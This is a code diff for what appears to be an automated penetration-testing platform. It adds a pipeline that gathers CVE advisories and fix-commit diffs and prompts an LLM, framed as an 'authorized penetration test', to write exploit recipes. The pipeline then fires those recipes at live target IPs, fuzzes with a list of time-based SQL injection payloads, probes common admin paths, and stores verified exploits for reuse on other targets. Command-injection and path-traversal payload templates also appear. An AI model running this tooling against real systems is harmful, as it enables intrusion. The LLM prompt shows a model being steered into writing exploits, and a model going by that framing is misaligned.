@@ -16574,14 +16574,491 @@ def _load_cve_exploit_specs():
     return _CVE_SPECS_CACHE
 
 
+def _ensure_derived_cve_specs_table():
+    """Durable store for agent-DERIVED exploit specs (verified recipes the auto-
+    derivation pipeline produced from advisory+patch intel). Separate from the
+    hand-authored YAML so the two sources are distinguishable. YAML wins when
+    both have an entry (operator-curated beats auto-derived)."""
+    try:
+        with get_db() as c, c.cursor() as cur:
+            cur.execute("""
+                CREATE TABLE IF NOT EXISTS public.derived_cve_specs (
+                    cve           text PRIMARY KEY,
+                    product       text,
+                    version       text,
+                    vuln_class    text,
+                    spec          jsonb NOT NULL,
+                    verified      boolean NOT NULL DEFAULT false,
+                    verify_method text,
+                    verify_evidence text,
+                    source        text,           -- 'intel' | 'intel+fuzz' | 'fuzz'
+                    derived_at    timestamptz NOT NULL DEFAULT now(),
+                    last_verified timestamptz
+                )""")
+            c.commit()
+    except Exception as e:  # noqa: BLE001
+        logging.debug("ensure derived_cve_specs failed: %s", e)
+
+
 def _cve_exploit_spec(cve):
+    """Resolve a per-CVE spec. Precedence: hand-curated YAML > agent-derived DB
+    (so an operator always wins). Returns the dict or None."""
     if not cve:
         return None
     cu = str(cve).upper()
     for s in _load_cve_exploit_specs():
         if str(s.get("cve", "")).upper() == cu:
             return s
+    try:
+        _ensure_derived_cve_specs_table()
+        with get_db() as c, c.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute("SELECT spec FROM public.derived_cve_specs "
+                        "WHERE cve = %s AND verified = true", (cu,))
+            r = cur.fetchone()
+            if r:
+                return r["spec"]
+    except Exception:  # noqa: BLE001
+        pass
     return None
+
+
+def _fetch_patch_diff(url, timeout=12, max_bytes=60000):
+    """Fetch the raw diff/patch from a fix-commit URL (GitHub/Gitee/GitLab/
+    Bitbucket). Returns the unified-diff text, or ''. Only the vulnerable-code
+    signal we actually need — not the whole repo."""
+    import httpx as _hx, re as _re
+    if not url:
+        return ""
+    u = str(url).strip()
+    # Normalize to raw-diff URLs where we can:
+    #   github.com/.../commit/<sha>           → + ".diff"
+    #   github.com/.../pull/<n>               → + ".diff"
+    #   github.com/.../compare/<a>...<b>      → + ".diff"
+    #   gitlab/gitee commit                   → + ".diff" (both support it)
+    if _re.search(r"github\.com/.*/(commit|pull|compare)/", u) and not u.endswith((".diff", ".patch")):
+        u = u.rstrip("/") + ".diff"
+    elif _re.search(r"(gitlab|gitee)\.com/.*/commit/", u) and not u.endswith((".diff", ".patch")):
+        u = u.rstrip("/") + ".diff"
+    elif "/browse/" in u:  # Atlassian/Bitbucket browse-style
+        return ""  # not a commit
+    try:
+        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as c:
+            r = c.get(u, headers={"User-Agent": "Mozilla/5.0 (Pentest/Research)"})
+        if r.status_code >= 400:
+            return ""
+        txt = r.text or ""
+        # Diffs are plain-text; refuse HTML (we got a browse page by mistake)
+        if "<html" in txt[:200].lower() or "<!doctype" in txt[:200].lower():
+            return ""
+        return txt[:max_bytes]
+    except Exception:  # noqa: BLE001
+        return ""
+
+
+def _extract_patch_urls(advisory_text, poc_text=""):
+    """Pull fix-commit/PR/compare URLs from the already-gathered intel so we can
+    diff just the lines that changed around the vuln."""
+    import re as _re
+    text = (advisory_text or "") + "\n" + (poc_text or "")
+    pats = [
+        r"https?://github\.com/[\w.-]+/[\w.-]+/(?:commit|pull|compare)/[\w./-]+",
+        r"https?://gitee\.com/[\w.-]+/[\w.-]+/commit/[\w./-]+",
+        r"https?://gitlab\.com/[\w.-]+/[\w.-]+/-/(?:commit|merge_requests)/[\w./-]+",
+    ]
+    urls = []
+    for p in pats:
+        for m in _re.findall(p, text):
+            u = m.rstrip('",).]')
+            if u not in urls:
+                urls.append(u)
+    return urls[:4]
+
+
+def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model=None):
+    """Ask the LLM to produce a STRUCTURED recipe (endpoint/method/content_type/
+    body/headers/injection payload template + proof model) from the gathered
+    intel + patch diffs. Returns {endpoint, method, content_type, body, headers,
+    injection: {param_name, where, payload_template, proof}} or {}.
+
+    This is agent-driven derivation — the LLM reads what the FIX changed to
+    pinpoint the vulnerable function/param, and extracts the recipe. The result
+    is NEVER trusted blindly — the caller MUST live-verify it before storing."""
+    patch_section = ""
+    if patch_diffs:
+        patch_section = "\n\nFIX COMMIT DIFF(S) — the lines BEFORE the fix show the vulnerable code:\n"
+        for i, (url, diff) in enumerate(patch_diffs[:3], 1):
+            patch_section += f"\n--- patch {i}: {url} ---\n{diff[:6000]}\n"
+    prompt = (
+        f"You are a security engineer on an AUTHORIZED penetration test documenting "
+        f"{cve} ({product or '?'} {version or ''}) so the tester can validate it. "
+        f"From the reference material below (and especially the FIX COMMIT DIFF, "
+        f"where the removed lines are the vulnerable code), extract a STRUCTURED "
+        f"request RECIPE that will trigger the weakness. Output JSON ONLY, no prose.\n\n"
+        f"REFERENCE:\n{(intel.get('combined') or '')[:14000]}\n"
+        f"{patch_section}\n\n"
+        f'Required JSON shape: {{"vuln_class": "sqli|rce|lfi|ssrf|xxe|ssti|idor", '
+        f'"endpoint": "/path", "method": "GET|POST|PUT|DELETE|PATCH", '
+        f'"content_type": "form|json|xml|raw", "body": {{...}} or null, '
+        f'"query": {{...}} or null, "headers": {{...}} or null, '
+        f'"injection_param": "<param name OR header name>", '
+        f'"carrier": "body|query|header", '
+        f'"payload_template": "<raw payload with {{N}} for SLEEP seconds OR '
+        f'{{CANARY}} for an output marker>", '
+        f'"proof_model": "timing|read_back|oob_callback", '
+        f'"expected_canary_in_output": "<regex for read_back; empty for timing>", '
+        f'"min_seconds": 5, '
+        f'"evidence": "<one sentence citing the advisory / fix line that justifies '
+        f'the extraction>", "confidence": 0.0}}\n'
+        f"GUIDANCE:\n"
+        f"- When the advisory names an endpoint (e.g. 'via editCategories.php') "
+        f"but not the exact param, pick the MOST LIKELY common param for the "
+        f"vuln class (SQLi: id/user/username/cat/page; file: file/path/name/url) "
+        f"and record best-guess with lower confidence. Live-verify + param-fuzz "
+        f"will catch mis-guesses, so err toward emitting a recipe over returning {{}}.\n"
+        f"- For SQLi default to timing proof (SLEEP for MySQL/MariaDB, pg_sleep "
+        f"for Postgres) — most reliable, no visible-output assumption.\n"
+        f"- For RCE/LFI prefer read_back: payload includes a canary (e.g. "
+        f"`;echo CANARY_{{CANARY}}` or `/../../../tmp/{{CANARY}}`) and set "
+        f"expected_canary_in_output to a regex matching that canary.\n"
+        f"- Only return {{}} when the advisory names NEITHER an endpoint NOR a "
+        f"vulnerable component. A named component is enough to produce a recipe."
+    )
+    try:
+        res = _llm_for_model(prompt, model=model, caller="cve_recipe_extract", num_predict=1024)
+        text = res.get("response", "") if isinstance(res, dict) else str(res or "")
+        obj = _poc_extract_json(text) or {}
+        if obj.get("endpoint") and obj.get("injection_param"):
+            return obj
+        logging.info("recipe extraction returned no concrete recipe for %s; raw LLM output (first 400 chars): %r",
+                     cve, text[:400])
+    except Exception as e:  # noqa: BLE001
+        logging.debug("recipe extraction failed: %s", e)
+    return {}
+
+
+def _recipe_to_spec(cve, product, recipe):
+    """Convert the LLM-extracted recipe to a cve_exploit_specs-shaped dict the
+    assembler already consumes. Only the fields _assemble_from_cve_spec /
+    _curl_from_cve_spec actually read."""
+    carrier = (recipe.get("carrier") or "body").lower()
+    inj_param = recipe.get("injection_param") or "id"
+    body = recipe.get("body")
+    query = recipe.get("query")
+    headers = recipe.get("headers") or {}
+    # Place {INJ} marker in the carrier the recipe named.
+    if carrier == "body":
+        if isinstance(body, dict):
+            body[inj_param] = "{INJ}"
+        else:
+            body = {inj_param: "{INJ}"}
+    elif carrier == "query":
+        if isinstance(query, dict):
+            query[inj_param] = "{INJ}"
+        else:
+            query = {inj_param: "{INJ}"}
+    elif carrier == "header":
+        headers[inj_param] = "{INJ}"
+    payload_tmpl = recipe.get("payload_template") or "1' AND (SELECT SLEEP({N}))-- -"
+    assertion = {"min_seconds": int(recipe.get("min_seconds") or 5), "max_seconds": 30}
+    if recipe.get("proof_model") == "read_back" and recipe.get("expected_canary_in_output"):
+        assertion = {"expect_regex": recipe["expected_canary_in_output"]}
+    return {
+        "cve": cve, "product": product,
+        "vuln_class": recipe.get("vuln_class") or "sqli",
+        "transport": "http",
+        "request": {
+            "method": (recipe.get("method") or "POST").upper(),
+            "path": recipe.get("endpoint") or "/",
+            "content_type": recipe.get("content_type") or "form",
+            **({"body": body} if body else {}),
+            **({"query": query} if query else {}),
+            **({"headers": headers} if headers else {}),
+        },
+        "injection": {"payload_template": payload_tmpl},
+        "assertion": assertion,
+        "notes": f"AUTO-DERIVED from advisory + patch diff. Evidence: "
+                 f"{(recipe.get('evidence') or '')[:300]}",
+    }
+
+
+def _live_verify_recipe(ip, port, spec, timeout=30):
+    """VERIFY a derived spec against the live target BEFORE storing it. For a
+    timing spec, run the SLEEP(5) payload and confirm elapsed >= 4.5s and the
+    scaled SLEEP(10) also fires. Returns {verified, method, evidence}."""
+    import time as _t
+    tmpl = (spec.get("injection") or {}).get("payload_template", "")
+    req = spec.get("request") or {}
+    assertion = spec.get("assertion") or {}
+    # Baseline (small/benign) + payload timing
+    try:
+        if assertion.get("min_seconds"):
+            # Timing proof
+            baseline_payload = tmpl.replace("{N}", "0") if "SLEEP" in tmpl.upper() else "1"
+            payload_5 = tmpl.replace("{N}", "5")
+            payload_10 = tmpl.replace("{N}", "10")
+            t0 = _t.time()
+            _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, baseline_payload), timeout=timeout)
+            b = _t.time() - t0
+            t0 = _t.time()
+            _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload_5), timeout=timeout)
+            t5 = _t.time() - t0
+            if t5 - b < 3.5:
+                return {"verified": False, "method": "timing", "elapsed_base": round(b, 2),
+                        "elapsed_5": round(t5, 2), "evidence": "payload did not block"}
+            # Confirm scaling: SLEEP(10) must be ~5s slower than SLEEP(5)
+            t0 = _t.time()
+            _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload_10), timeout=timeout + 10)
+            t10 = _t.time() - t0
+            if t10 - t5 < 3.5:
+                return {"verified": False, "method": "timing_unconfirmed",
+                        "elapsed_5": round(t5, 2), "elapsed_10": round(t10, 2),
+                        "evidence": "second run did not scale with payload"}
+            return {"verified": True, "method": "latency_confirmed",
+                    "evidence": f"baseline={b:.1f}s SLEEP(5)={t5:.1f}s SLEEP(10)={t10:.1f}s"}
+        if assertion.get("expect_regex"):
+            # Read-back proof
+            canary = "POC" + os.urandom(5).hex()
+            payload = tmpl.replace("{CANARY}", canary).replace("{INJ}", canary)
+            out = _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload), timeout=timeout)
+            if canary in (out or "") or _re_search_safe(assertion["expect_regex"], out or ""):
+                return {"verified": True, "method": "canary_read_back",
+                        "evidence": f"canary {canary} appeared in output"}
+            return {"verified": False, "method": "canary_missing",
+                    "evidence": "canary did not appear in output"}
+    except Exception as e:  # noqa: BLE001
+        return {"verified": False, "method": "verify_error", "evidence": str(e)}
+    return {"verified": False, "method": "no_assertion", "evidence": "spec had no verifiable assertion"}
+
+
+def _re_search_safe(pattern, text):
+    import re as _re
+    try:
+        return bool(_re.search(pattern, text, _re.I | _re.S))
+    except Exception:  # noqa: BLE001
+        return False
+
+
+def _curl_run(ip, port, cmd, timeout=30):
+    """Execute a curl via the kali-listener (scope-gated upstream) and return
+    its output. Used by the live-verify step so network traffic is still gated."""
+    import httpx as _hx
+    listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
+    try:
+        r = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                     json={"command": cmd, "target": str(ip), "port": port, "timeout": timeout},
+                     headers={"x-api-key": API_KEY}, verify=False, timeout=timeout + 30)
+        d = r.json() if r.status_code < 500 else {}
+        return (d.get("output", "") if isinstance(d, dict) else "") or r.text
+    except Exception as e:  # noqa: BLE001
+        return f"listener error: {e}"
+
+
+def _derive_cve_spec(cve, product, version, ip, port, model=None, auth=None,
+                     allow_fuzz=True):
+    """AUTO-DERIVATION PIPELINE — operator ask: have the AGENT do the work, not
+    have Claude pre-encode specs. Flow:
+      1) Gather CVE intel (advisory + GHSA + Jira + ExploitDB) — already a shared
+         helper (_gather_cve_intel) used by research + deep-dive.
+      2) For each fix-commit URL in the intel, fetch the raw diff — the removed
+         lines are the vulnerable code.
+      3) LLM extracts a structured recipe from intel + patch diffs.
+      4) LIVE-VERIFY the recipe against the target (timing / canary scaling).
+      5) FALLBACK: if the recipe fails verification but named concrete params,
+         selectively fuzz those params with a timing payload.
+      6) Store the VERIFIED spec in derived_cve_specs so future builds (and other
+         targets of the same CVE) consume it immediately.
+    Returns {verified, source, spec, evidence}."""
+    _ensure_derived_cve_specs_table()
+    # Short-circuit: already derived AND verified
+    try:
+        with get_db() as c, c.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute("SELECT spec, verify_method, verify_evidence FROM public.derived_cve_specs "
+                        "WHERE cve = %s AND verified = true", (str(cve).upper(),))
+            r = cur.fetchone()
+            if r:
+                return {"verified": True, "source": "cache", "spec": r["spec"],
+                        "evidence": r.get("verify_evidence")}
+    except Exception:  # noqa: BLE001
+        pass
+    # 1. Intel
+    try:
+        intel = _gather_cve_intel(cve, product=product, version=version,
+                                  include_msf_edb=True)
+    except Exception as e:  # noqa: BLE001
+        return {"verified": False, "source": "intel", "spec": None, "evidence": f"intel error: {e}"}
+    # 2. Patch diffs
+    urls = _extract_patch_urls(intel.get("advisory_text", ""), intel.get("poc_text", ""))
+    patches = []
+    for u in urls:
+        d = _fetch_patch_diff(u)
+        if d:
+            patches.append((u, d))
+    # 3. LLM extract
+    recipe = _llm_extract_exploit_recipe(cve, product, version, intel, patches, model=model)
+    if not recipe.get("endpoint") or not recipe.get("injection_param"):
+        return {"verified": False, "source": "extract",
+                "spec": None, "evidence": "recipe extraction returned no concrete recipe"}
+    spec = _recipe_to_spec(cve, product, recipe)
+    # 4. Live verify
+    verdict = _live_verify_recipe(ip, port, spec)
+    if verdict["verified"]:
+        _store_derived_spec(cve, product, version, spec, verdict, source="intel")
+        return {"verified": True, "source": "intel", "spec": spec,
+                "evidence": verdict.get("evidence")}
+    # 4b. If verify looks like a 404 (endpoint not at expected path on this
+    #     install), discover variants and retry verify on each.
+    probe = _curl_run(ip, port, _curl_from_cve_spec(ip, port, spec.get("request") or {},
+                                                   "1"), timeout=10)
+    if "404" in (probe or "")[:600] or "Not Found" in (probe or "")[:600]:
+        for variant in _discover_endpoint_variants(ip, port,
+                                                   (spec.get("request") or {}).get("path", "/")):
+            vspec = dict(spec); vspec["request"] = dict(spec["request"]); vspec["request"]["path"] = variant
+            vv = _live_verify_recipe(ip, port, vspec)
+            if vv["verified"]:
+                _store_derived_spec(cve, product, version, vspec, vv,
+                                    source="intel+discovery")
+                return {"verified": True, "source": "intel+discovery", "spec": vspec,
+                        "evidence": f"endpoint variant {variant}: {vv.get('evidence')}"}
+            # also try fuzz on the discovered variant
+            if allow_fuzz:
+                fz = _selective_fuzz_recipe(ip, port, vspec)
+                if fz["verified"]:
+                    vspec["injection"]["payload_template"] = fz["payload_template"]
+                    _store_derived_spec(cve, product, version, vspec, fz,
+                                        source="intel+discovery+fuzz")
+                    return {"verified": True, "source": "intel+discovery+fuzz",
+                            "spec": vspec,
+                            "evidence": f"endpoint variant {variant}: {fz.get('evidence')}"}
+    # 5. Selective fuzz fallback (same endpoint/param, varied payload shapes)
+    if allow_fuzz:
+        fuzz = _selective_fuzz_recipe(ip, port, spec)
+        if fuzz["verified"]:
+            spec["injection"]["payload_template"] = fuzz["payload_template"]
+            _store_derived_spec(cve, product, version, spec, fuzz, source="intel+fuzz")
+            return {"verified": True, "source": "intel+fuzz", "spec": spec,
+                    "evidence": fuzz.get("evidence")}
+    return {"verified": False, "source": "extract+verify",
+            "spec": spec, "evidence": verdict.get("evidence")}
+
+
+def _discover_endpoint_variants(ip, port, named_path, session_cookie=None, timeout=10):
+    """When the LLM named an endpoint that 404s on this install, discover close
+    variants: the basename at common subpaths (admin/, administrator/, index/)
+    and glob the Apache/nginx DirectoryIndex pages for files matching the name.
+    Returns [path, ...] (paths that returned non-404)."""
+    import httpx as _hx, os as _os
+    base = f"http://{ip}:{port or 80}"
+    hits = []
+    bn = _os.path.basename((named_path or "/").rstrip("/"))
+    stem = bn.rsplit(".", 1)[0] if "." in bn else bn
+    # Candidate paths: named + common prefixes
+    prefixes = ["", "/", "/admin/", "/admin1/", "/administrator/", "/wp-admin/",
+                "/manage/", "/panel/", "/includes/", "/classes/", "/api/",
+                "/ajax/", "/action/", "/system/", "/backend/", "/console/",
+                "/dashboard/", "/public/", "/scripts/"]
+    tried = set()
+    try:
+        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout,
+                        headers={"Cookie": session_cookie} if session_cookie else {}) as c:
+            for pref in prefixes:
+                p = (pref + bn) if pref else bn
+                if not p.startswith("/"):
+                    p = "/" + p
+                if p in tried:
+                    continue
+                tried.add(p)
+                try:
+                    r = c.get(base + p)
+                except Exception:  # noqa: BLE001
+                    continue
+                if r.status_code != 404 and r.status_code < 500:
+                    hits.append(p)
+                    if len(hits) >= 5:
+                        return hits
+            # Last resort: parse any directory listing on root for files whose
+            # name shares the stem (Apache DirectoryIndex, open directory).
+            for root in ("/", "/admin/", "/admin1/"):
+                try:
+                    r = c.get(base + root)
+                    import re as _re
+                    for m in _re.finditer(r'href="([^"?#]+\.php)"', r.text or ""):
+                        p = m.group(1)
+                        full = p if p.startswith("/") else root + p
+                        if stem.lower() in full.lower() and full not in tried:
+                            tried.add(full)
+                            hits.append(full)
+                            if len(hits) >= 5:
+                                return hits
+                except Exception:  # noqa: BLE001
+                    continue
+    except Exception:  # noqa: BLE001
+        pass
+    return hits
+
+
+def _selective_fuzz_recipe(ip, port, spec, timeout=30):
+    """When the LLM-extracted payload didn't fire, try a bounded set of common
+    timing payloads on the SAME endpoint/param (the research still named a
+    concrete attack surface — just the exact payload shape was wrong). Returns
+    {verified, payload_template, evidence}."""
+    import time as _t
+    req = spec.get("request") or {}
+    candidates = [
+        "' AND (SELECT SLEEP({N}))-- -",
+        "' OR SLEEP({N})-- -",
+        "1' AND SLEEP({N})-- -",
+        "1 AND SLEEP({N})-- -",
+        "1'-(SELECT SLEEP({N}))-'",
+        "1\" AND SLEEP({N})-- -",
+        "1); SELECT SLEEP({N})-- -",
+        "'||pg_sleep({N})||'",
+        "1' AND pg_sleep({N})-- -",
+    ]
+    for tmpl in candidates:
+        try:
+            payload = tmpl.replace("{N}", "5")
+            t0 = _t.time()
+            _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload), timeout=timeout)
+            el = _t.time() - t0
+            if el >= 4.5:
+                # confirm scaling
+                payload10 = tmpl.replace("{N}", "10")
+                t0 = _t.time()
+                _curl_run(ip, port, _curl_from_cve_spec(ip, port, req, payload10), timeout=timeout + 10)
+                el10 = _t.time() - t0
+                if el10 - el >= 3.5:
+                    return {"verified": True, "payload_template": tmpl,
+                            "method": "latency_confirmed",
+                            "evidence": f"fuzz hit: {tmpl} → {el:.1f}s, SLEEP(10)→{el10:.1f}s"}
+        except Exception:  # noqa: BLE001
+            continue
+    return {"verified": False, "payload_template": "",
+            "evidence": "no fuzz payload fired on the named param"}
+
+
+def _store_derived_spec(cve, product, version, spec, verdict, source):
+    """Persist a VERIFIED derived spec so future builds (and other targets of
+    the same CVE) use it immediately — no re-derivation cost."""
+    import json as _json
+    try:
+        _ensure_derived_cve_specs_table()
+        with get_db() as c, c.cursor() as cur:
+            cur.execute("""
+                INSERT INTO public.derived_cve_specs
+                  (cve, product, version, vuln_class, spec, verified,
+                   verify_method, verify_evidence, source, last_verified)
+                VALUES (%s,%s,%s,%s,%s::jsonb,true,%s,%s,%s,now())
+                ON CONFLICT (cve) DO UPDATE SET
+                  spec = EXCLUDED.spec, verified = true,
+                  verify_method = EXCLUDED.verify_method,
+                  verify_evidence = EXCLUDED.verify_evidence,
+                  source = EXCLUDED.source, last_verified = now()
+            """, (str(cve).upper(), product, version, spec.get("vuln_class"),
+                  _json.dumps(spec), verdict.get("method"),
+                  (verdict.get("evidence") or "")[:1000], source))
+            c.commit()
+    except Exception as e:  # noqa: BLE001
+        logging.debug("store derived spec failed: %s", e)
 
 
 def _sh_q(s):
